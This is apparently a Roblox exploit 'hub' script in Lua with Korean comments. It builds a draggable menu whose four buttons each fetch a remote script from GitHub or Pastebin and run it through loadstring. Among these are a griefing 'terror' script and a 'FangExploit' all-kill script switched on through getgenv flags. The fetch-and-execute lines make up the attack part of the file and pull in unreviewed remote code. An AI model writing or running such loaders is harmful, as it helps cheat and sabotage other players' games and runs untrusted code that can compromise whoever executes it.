local player = game.Players.LocalPlayer  
local playerGui = player:WaitForChild("PlayerGui")  
  
-- ScreenGui 생성  
local gui = Instance.new("ScreenGui")  
gui.Name = "MobileHub"  
gui.ResetOnSpawn = false  
gui.Parent = playerGui  
  
-- MainFrame (허브 UI 전체)  
local mainFrame = Instance.new("Frame")  
mainFrame.Size = UDim2.new(0, 250, 0, 180)  
mainFrame.Position = UDim2.new(0.5, -125, 0.4, -90)  
mainFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)  -- 찐검정 배경  
mainFrame.BorderSizePixel = 0  
mainFrame.Parent = gui  
  
-- TitleBar (드래그 가능 영역)  
local titleBar = Instance.new("Frame")  
titleBar.Size = UDim2.new(1, 0, 0, 30)  
titleBar.BackgroundColor3 = Color3.fromRGB(25, 25, 25)  
titleBar.BorderSizePixel = 0  
titleBar.Parent = mainFrame  
  
-- "ALL 허브" 텍스트 추가 (찐검정 배경에 흰색 글씨)  
local allHubLabel = Instance.new("TextLabel")  
allHubLabel.Size = UDim2.new(1, 0, 0, 30)  
allHubLabel.Position = UDim2.new(0, 0, 0, 0)  
allHubLabel.Text = "crow x ALL 허브"  
allHubLabel.TextColor3 = Color3.fromRGB(255, 255, 255)  -- 흰색 글씨  
allHubLabel.TextSize = 20  
allHubLabel.Font = Enum.Font.SourceSansBold  
allHubLabel.BackgroundTransparency = 1  
allHubLabel.Parent = mainFrame  
  
-- 허브 UI 내용 예제 (제작자 표시)  
local textLabel = Instance.new("TextLabel")  
textLabel.Size = UDim2.new(1, 0, 1, -30)  
textLabel.Position = UDim2.new(0, 0, 0, 30)  
textLabel.Text = "Made by crow_0_inf(콘솔x)"  
textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)  
textLabel.BackgroundTransparency = 1  
textLabel.Parent = mainFrame  
  
-- 버튼 생성 함수  
local function createButton(text, position, callback)  
    local button = Instance.new("TextButton")  
    button.Size = UDim2.new(0.4, 0, 0, 30)  
    button.Position = position  
    button.Text = text  
    button.TextColor3 = Color3.fromRGB(0, 0, 0)  
    button.TextSize = 18  
    button.BackgroundColor3 = Color3.fromRGB(255, 0, 0)  
    button.Parent = mainFrame  
  
    local buttonCorner = Instance.new("UICorner")    
    buttonCorner.CornerRadius = UDim.new(0, 10)    
    buttonCorner.Parent = button    
  
    button.MouseButton1Click:Connect(callback)    
    return button  
end  
  
-- 버튼 생성  
local topLeftButton = createButton("랜부 테러", UDim2.new(0.05, 0, 0.2, 0), function()  
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Dain29292929/Lang/refs/heads/main/Protected_5412012837486253.txt"))()  
end)  
  
local topRightButton = createButton("팽부 올킬", UDim2.new(0.55, 0, 0.2, 0), function()  
    getgenv().exclude_me = false  
    getgenv().kill = true  
    getgenv().fire = false  
    local func = ({pcall(loadstring, game:HttpGet("https://raw.githubusercontent.com/xsinew/scripts/refs/heads/main/FangExploit.lua"))})[2]  
    pcall(func, func)  
end)  
  
-- "사이틱 허브 실행" 버튼 추가 (변경됨)  
local bottomLeftButton = createButton("사이틱 허브 실행", UDim2.new(0.05, 0, 0.75, 0), function()  
    loadstring(game:HttpGet('https://raw.githubusercontent.com/crow-max-0/Sc-/refs/heads/main/README.md'))()  
end)  
  
-- "hello 허브" 버튼 추가  
local bottomRightButton = createButton("hello 허브", UDim2.new(0.55, 0, 0.75, 0), function()  
    loadstring(game:HttpGet('https://pastebin.com/raw/86uWiF9m'))()  
end)  
  
-- 허브 보이기/숨기기 버튼  
local settingsButton = Instance.new("TextButton")  
settingsButton.Size = UDim2.new(0, 50, 0, 50)  
settingsButton.Position = UDim2.new(0, 10, 0.5, -25)  
settingsButton.Text = "⚙️"  
settingsButton.TextColor3 = Color3.fromRGB(255, 255, 255)  
settingsButton.BackgroundColor3 = Color3.fromRGB(30, 30, 30)  
settingsButton.Parent = gui  
  
mainFrame.Visible = false  
settingsButton.MouseButton1Click:Connect(function()  
    mainFrame.Visible = not mainFrame.Visible  
end)  
  
-- 🛠️ 드래그 기능  
local UserInputService = game:GetService("UserInputService")  
local dragging, dragInput, dragStart, startPos  
  
titleBar.InputBegan:Connect(function(input)  
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then  
        dragging = true  
        dragStart = input.Position  
        startPos = mainFrame.Position  
  
        input.Changed:Connect(function()    
            if input.UserInputState == Enum.UserInputState.End then    
                dragging = false    
            end    
        end)    
    end  
end)  
  
titleBar.InputChanged:Connect(function(input)  
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then  
        dragInput = input  
    end  
end)  
  
UserInputService.InputChanged:Connect(function(input)  
    if dragging and input == dragInput then  
        local delta = input.Position - dragStart  
        local newX = startPos.X.Offset + delta.X  
        local newY = startPos.Y.Offset + delta.Y  
        mainFrame.Position = UDim2.new(startPos.X.Scale, newX, startPos.Y.Scale, newY)  
    end  
end)
